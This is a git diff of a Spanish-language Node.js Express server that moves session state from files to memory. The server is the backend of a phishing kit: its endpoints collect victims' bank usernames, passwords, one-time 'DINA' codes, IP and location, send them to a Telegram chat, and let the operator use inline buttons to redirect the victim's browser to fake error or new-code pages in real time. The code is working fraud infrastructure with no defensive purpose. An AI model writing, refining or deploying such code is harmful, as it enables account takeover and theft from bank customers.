@@ -1,6 +1,4 @@
 import 'dotenv/config';
-import fs from 'fs/promises';
-import path from 'path';
 import express from 'express';
 import cors from 'cors';
 
@@ -11,27 +9,23 @@ app.use(cors());
 const PORT = process.env.PORT || 10000;
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
-const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL; // https://xxxx.onrender.com
+const PUBLIC_BASE_URL = process.env.PUBLIC_BASE_URL;
 const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-const BASE_DIR = process.cwd();
-const STATE_DIR = path.join(BASE_DIR, 'verificaciones');
-
-async function ensureStateDir() {
-  try { await fs.mkdir(STATE_DIR, { recursive: true }); } catch {}
-}
-await ensureStateDir();
-
-// --------------------- util de estado por sessionId ---------------------
-const stateFile = (sessionId) => path.join(STATE_DIR, `${sessionId}.json`);
+// --------------------- Estado en memoria (sin archivos) ---------------------
+const sessionStates = new Map();
 
 async function readState(sessionId) {
-  try {
-    const raw = await fs.readFile(stateFile(sessionId), 'utf8');
-    return JSON.parse(raw);
-  } catch {
-    return { sessionId, history: [], lastUpdate: null, pending: null, data: {} };
+  if (!sessionStates.has(sessionId)) {
+    sessionStates.set(sessionId, {
+      sessionId,
+      data: {},
+      history: [],
+      pending: null,
+      lastUpdate: null
+    });
   }
+  return sessionStates.get(sessionId);
 }
 
 async function writeState(sessionId, patch) {
@@ -41,11 +35,13 @@ async function writeState(sessionId, patch) {
     ...patch,
     lastUpdate: new Date().toISOString()
   };
-  await fs.writeFile(stateFile(sessionId), JSON.stringify(updated, null, 2));
+  sessionStates.set(sessionId, updated);
   return updated;
 }
 
-function ts() { return new Date().toISOString(); }
+function ts() {
+  return new Date().toISOString();
+}
 
 // --------------------- Telegram helpers ---------------------
 async function tgSendMessage(text, inlineKeyboard) {
@@ -71,27 +67,18 @@ function kbBtn(text, data) {
 }
 
 function buttonsForStep(step, sessionId) {
-  // step: 'virtual' | 'otp1' | 'otp2'
   if (step === 'virtual') {
     return [
-      kbBtn('🔁 Error Logo',   { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
-      kbBtn('➡️ Siguiente',    { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
+      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
+      kbBtn('➡️ Siguiente', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
     ];
   }
-  if (step === 'otp1') {
+  if (step === 'otp1' || step === 'otp2') {
     return [
-      kbBtn('🔁 Error Logo',   { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
-      kbBtn('⚠️ Error OTP',    { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
-      kbBtn('🔄 Nuevo OTP',    { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
-      kbBtn('✅ Finalizar',     { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
-    ];
-  }
-  if (step === 'otp2') {
-    return [
-      kbBtn('🔁 Error Logo',   { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
-      kbBtn('⚠️ Error OTP',    { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
-      kbBtn('🔄 Nuevo OTP',    { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
-      kbBtn('✅ Finalizar',     { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
+      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
+      kbBtn('⚠️ Error OTP', { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
+      kbBtn('🔄 Nuevo OTP', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
+      kbBtn('✅ Finalizar', { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
     ];
   }
   return [];
@@ -99,26 +86,23 @@ function buttonsForStep(step, sessionId) {
 
 function fmt(k, v) {
   if (!v) return '';
-  return `<b>${k}:</b> ${String(v).replace(/</g,'&lt;').replace(/>/g,'&gt;')}`;
+  return `<b>${k}:</b> ${String(v).replace(/</g, '&lt;').replace(/>/g, '&gt;')}`;
 }
 
-// --------------------- Rutas de ingreso ---------------------
+// --------------------- Rutas ---------------------
 
-// 1) Primer paso: Virtual-Persona
 app.post('/virtualpersona', async (req, res) => {
   try {
     const { sessionId, user, pass, ip, country, city } = req.body || {};
     if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
 
-    // guarda estado
     const updated = await writeState(sessionId, {
       step: 'virtual',
-      data: { ...((await readState(sessionId)).data), user, pass, ip, country, city },
+      data: { ...(await readState(sessionId)).data, user, pass, ip, country, city },
       history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'virtualpersona', user, ip, country, city } ],
       pending: null
     });
 
-    // mensaje
     const text =
 `<b>🔐 Nuevo Ingreso</b>
 
@@ -131,8 +115,7 @@ ${fmt('🏘️ Ciudad', city)}
 <b>SessionID:</b> <code>${sessionId}</code>
 ⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
 
-    await tgSendMessage(text, [ ...buttonsForStep('virtual', sessionId) ]);
-
+    await tgSendMessage(text, buttonsForStep('virtual', sessionId));
     res.json({ ok: true });
   } catch (e) {
     console.error(e);
@@ -140,7 +123,6 @@ ${fmt('🏘️ Ciudad', city)}
   }
 });
 
-// 2) OTP DINA (opcion1)
 app.post('/otp1', async (req, res) => {
   try {
     const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
@@ -148,7 +130,7 @@ app.post('/otp1', async (req, res) => {
 
     const updated = await writeState(sessionId, {
       step: 'otp1',
-      data: { ...((await readState(sessionId)).data), user, pass, dina, ip, country, city },
+      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
       history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp1', dina } ],
       pending: null
     });
@@ -166,8 +148,7 @@ ${fmt('🏘️ Ciudad', city)}
 <b>SessionID:</b> <code>${sessionId}</code>
 ⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
 
-    await tgSendMessage(text, [ ...buttonsForStep('otp1', sessionId) ]);
-
+    await tgSendMessage(text, buttonsForStep('otp1', sessionId));
     res.json({ ok: true });
   } catch (e) {
     console.error(e);
@@ -175,7 +156,6 @@ ${fmt('🏘️ Ciudad', city)}
   }
 });
 
-// 3) OTP new DINA (opcion2)
 app.post('/otp2', async (req, res) => {
   try {
     const { sessionId, user, pass, dina, ip, country, city } = req.body || {};
@@ -183,7 +163,7 @@ app.post('/otp2', async (req, res) => {
 
     const updated = await writeState(sessionId, {
       step: 'otp2',
-      data: { ...((await readState(sessionId)).data), user, pass, dina, ip, country, city },
+      data: { ...(await readState(sessionId)).data, user, pass, dina, ip, country, city },
       history: [ ...(await readState(sessionId)).history, { t: ts(), event: 'otp2', dina } ],
       pending: null
     });
@@ -201,8 +181,7 @@ ${fmt('🏘️ Ciudad', city)}
 <b>SessionID:</b> <code>${sessionId}</code>
 ⏱️ <i>${new Date().toLocaleString('es-CO')}</i>`;
 
-    await tgSendMessage(text, [ ...buttonsForStep('otp2', sessionId) ]);
-
+    await tgSendMessage(text, buttonsForStep('otp2', sessionId));
     res.json({ ok: true });
   } catch (e) {
     console.error(e);
@@ -210,13 +189,11 @@ ${fmt('🏘️ Ciudad', city)}
   }
 });
 
-// --------------------- Polling desde loading.html ---------------------
 app.get('/instruction/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
   if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
 
   const st = await readState(sessionId);
-  // si hay instrucción pendiente, la devuelvo y limpio para que sea one-shot
   if (st.pending && st.pending.redirect_to) {
     const redirect_to = st.pending.redirect_to;
     await writeState(sessionId, { pending: null });
@@ -225,15 +202,13 @@ app.get('/instruction/:sessionId', async (req, res) => {
   res.json({ redirect_to: null });
 });
 
-// --------------------- Webhook de Telegram ---------------------
-// setea el webhook: GET /set-webhook (opcional)
 app.get('/set-webhook', async (req, res) => {
   try {
     if (!PUBLIC_BASE_URL) return res.status(400).send('PUBLIC_BASE_URL requerido');
     const webhookUrl = `${PUBLIC_BASE_URL}/telegram/webhook`;
     const r = await fetch(`${TG_API}/setWebhook`, {
       method: 'POST',
-      headers: {'content-type':'application/json'},
+      headers: { 'content-type': 'application/json' },
       body: JSON.stringify({ url: webhookUrl })
     });
     const j = await r.json();
@@ -244,12 +219,9 @@ app.get('/set-webhook', async (req, res) => {
   }
 });
 
-// entrada del webhook
 app.post('/telegram/webhook', async (req, res) => {
   try {
     const body = req.body;
-
-    // Responder rápido
     res.sendStatus(200);
 
     const cb = body.callback_query;
@@ -261,7 +233,6 @@ app.post('/telegram/webhook', async (req, res) => {
       const { sessionId, action, redirect_to } = data;
 
       if (action === 'redirect' && redirect_to) {
-        // guardo instrucción pendiente para ese sessionId
         await writeState(sessionId, { pending: { redirect_to, at: ts() } });
       }
     }
@@ -273,9 +244,5 @@ app.post('/telegram/webhook', async (req, res) => {
 app.get('/health', (_, res) => res.send('ok'));
 
 app.listen(PORT, () => {
-  console.log(`Server listening on ${PORT}`);
+  console.log(`✅ Server listening on ${PORT}`);
 });
-app.get('/', (req, res) => {
-  res.send('Servidor activo');
-});
-
